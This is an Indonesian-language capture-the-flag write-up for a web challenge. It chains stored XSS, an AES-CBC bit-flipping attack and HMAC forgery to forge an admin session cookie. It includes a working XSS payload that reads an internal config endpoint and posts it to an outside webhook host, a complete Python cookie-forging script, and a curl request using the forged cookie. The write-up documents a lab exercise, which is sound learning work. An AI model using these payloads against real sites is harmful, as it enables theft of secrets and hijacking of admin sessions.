# Writeup <cryptweb>

Pada challenge ini ditemukan vulnerability Stored XSS pada fitur *reviews*. Namun meskipun XSS dapat dijalankan, akses ke FLAG tetap dibatasi oleh sistem autentikasi internal. FLAG hanya dapat diakses oleh admin melalui endpoint: /admin/dashboard


Server menentukan apakah user adalah admin melalui cookie session terenkripsi, bukan berdasarkan username. Cookie tersebut hanya berisi plaintext: is_admin=0; untuk user biasa, dan: is_admin=1; untuk admin.

Cookie disimpan sebagai hasil enkripsi **AES-CBC** dan divalidasi integritasnya menggunakan **HMAC-SHA256**. Server memberikan dua cookie:

1. `auth = <ciphertext || HMAC>`
2. `iv   = <AES IV>`

Karena plaintext session sangat pendek, berada di blok pertama, dan formatnya fix, challenge ini dapat dieksploitasi dengan kombinasi:

- **Stored XSS** → mencuri SIGN_KEY  
- **AES-CBC Bit-Flipping Attack** → mengubah plaintext  
- **HMAC Forgery** → membuat cookie admin valid  
- → akses `/admin/dashboard`

---
```Javascript
<script>
fetch("/internal/config")
  .then(r=>r.text())
  .then(data =>
    fetch("https://webhook.site/<ID>", {
      method: "POST",
      body: data
    })
  )
</script>
```
```python
import sys
from typing import Tuple
from Crypto.Hash import HMAC, SHA256

BLOCK_SIZE = 16
TARGET = b"is_admin=0;"
REPLACEMENT = b"is_admin=1;"


def forge_cookie(sign_key_hex: str, auth_hex: str, iv_hex: str) -> Tuple[str, str]:
    sign_key = bytes.fromhex(sign_key_hex)
    data = bytes.fromhex(auth_hex)
    ct = bytearray(data[:-32])
    iv = bytearray(bytes.fromhex(iv_hex))

    for i in range(len(TARGET)):
        iv[i] ^= TARGET[i] ^ REPLACEMENT[i]

    mac = HMAC.new(sign_key, bytes(iv) + bytes(ct), SHA256).digest()
    forged_auth = (bytes(ct) + mac).hex()
    return forged_auth, bytes(iv).hex()


def main():
    try:
        sign_key_hex = input("sign key hex : ").strip()
        auth_hex = input("auth cookie  : ").strip()
        iv_hex = input("iv cookie    : ").strip()

        forged_auth, forged_iv = forge_cookie(sign_key_hex, auth_hex, iv_hex)

        print("\n=== FORGED ADMIN COOKIE ===")
        print("auth =", forged_auth)
        print("iv   =", forged_iv)
    except Exception as exc:
        sys.exit(f"Error: {exc}")


if __name__ == "__main__":
    main()
```
```bash
curl "http://localhost/admin/dashboard" -H "Cookie: <auth={new_auth}>; iv={iv}"
```

